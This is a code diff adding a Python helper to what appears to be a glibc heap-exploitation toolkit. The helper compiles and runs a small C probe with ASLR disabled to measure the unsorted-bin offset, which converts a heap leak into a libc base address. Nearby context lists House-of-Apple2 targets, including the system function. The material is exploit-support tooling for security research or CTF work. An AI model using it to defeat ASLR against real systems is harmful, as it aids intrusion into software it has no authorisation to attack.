@@ -217,3 +217,72 @@ def house_of_apple2_targets(libc_data: bytes) -> dict:
         return {}
     return {"stdout": s["_IO_2_1_stdout_"], "wfile_jumps": s["_IO_wfile_jumps"],
             "system": s["system"]}
+
+
+def unsorted_bin_offset(libc_path=None):
+    """Offset from a libc's load base to where a lone unsorted-bin chunk's fd points
+    (`main_arena + 0x60`) -- the value a heap "view of a freed large chunk" leak discloses, so
+    `libc_base = leaked - unsorted_bin_offset(libc)`. This is glibc-version-specific and not an
+    exported symbol, so it is MEASURED: compile a tiny malloc/free/print helper, run it against the
+    given libc under ASLR-off, and read the offset from /proc/maps. Cached per libc. Returns None
+    when there is no compiler or the probe fails (the caller then needs an analyst-supplied value)."""
+    import os
+    import shutil
+    import struct
+    import subprocess
+    import tempfile
+    key = os.path.realpath(libc_path) if libc_path else "system"
+    cache = getattr(unsorted_bin_offset, "_cache", None)
+    if cache is None:
+        cache = unsorted_bin_offset._cache = {}
+    if key in cache:
+        return cache[key]
+    gcc = shutil.which("gcc") or shutil.which("cc")
+    setarch = shutil.which("setarch")
+    if not gcc or not setarch:
+        cache[key] = None
+        return None
+    d = tempfile.mkdtemp(prefix="lykos-arena-")
+    try:
+        src = os.path.join(d, "a.c")
+        with open(src, "w") as f:
+            f.write('#include <stdlib.h>\n#include <unistd.h>\n'
+                    'int main(){ void*a=malloc(0x430); malloc(0x430); free(a);\n'
+                    '  write(1, a, 8); char c; read(0,&c,1); return 0; }\n')  # pause: keep maps live
+        exe = os.path.join(d, "a")
+        env = dict(os.environ)
+        cmd = [gcc, src, "-o", exe]
+        if libc_path:                                          # link/run against a specific libc
+            libdir = os.path.dirname(os.path.realpath(libc_path))
+            env["LD_LIBRARY_PATH"] = libdir + ":" + env.get("LD_LIBRARY_PATH", "")
+        if subprocess.run(cmd, capture_output=True, env=env).returncode:
+            cache[key] = None
+            return None
+        proc = subprocess.Popen([setarch, "-R", exe], stdin=subprocess.PIPE,
+                                stdout=subprocess.PIPE, env=env)
+        out = proc.stdout.read(8)                               # blocks until the leak is written
+        try:
+            maps = open(f"/proc/{proc.pid}/maps").read().splitlines()  # process paused on read()
+        except OSError:
+            maps = []
+        try:
+            proc.stdin.write(b"\n"); proc.stdin.flush()        # let it exit
+        except OSError:
+            pass
+        proc.wait(timeout=3)
+        leaked = struct.unpack("<Q", out.ljust(8, b"\x00"))[0] if len(out) >= 8 else 0
+
+        def _rng(line):
+            a, b = line.split()[0].split("-")
+            return int(a, 16), int(b, 16)
+        # the leak sits in libc's DATA segment; the load base is the LOWEST libc mapping
+        libc_starts = [_rng(m)[0] for m in maps if "libc" in m]
+        base = min(libc_starts) if libc_starts else 0
+        off = leaked - base if base and leaked > base else None
+        cache[key] = off
+        return off
+    except Exception:                                          # noqa: BLE001
+        cache[key] = None
+        return None
+    finally:
+        shutil.rmtree(d, ignore_errors=True)
